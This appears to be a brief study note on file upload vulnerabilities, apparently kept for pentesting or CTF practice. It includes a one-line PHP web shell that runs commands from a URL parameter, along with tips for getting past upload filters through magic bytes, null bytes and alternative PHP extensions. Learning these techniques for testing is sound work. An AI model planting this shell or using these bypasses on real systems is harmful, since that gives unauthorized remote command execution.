modify the POST request using burp to upload files such as .txt and .php

.php:

```
<?php system($_GET['cmd']); ?>
```

fuzz for the directory where its uploaded

if the website is checking magic bytes, we can embed the payload within the normal format with a .php extension 

null byte attacks

if blocklist is used
google for valid php file extensions 

![[Pasted image 20240803163249.png]]
![[Pasted image 20240803163350.png]]

with magic bytes:
\
![[Pasted image 20240803163946.png]]


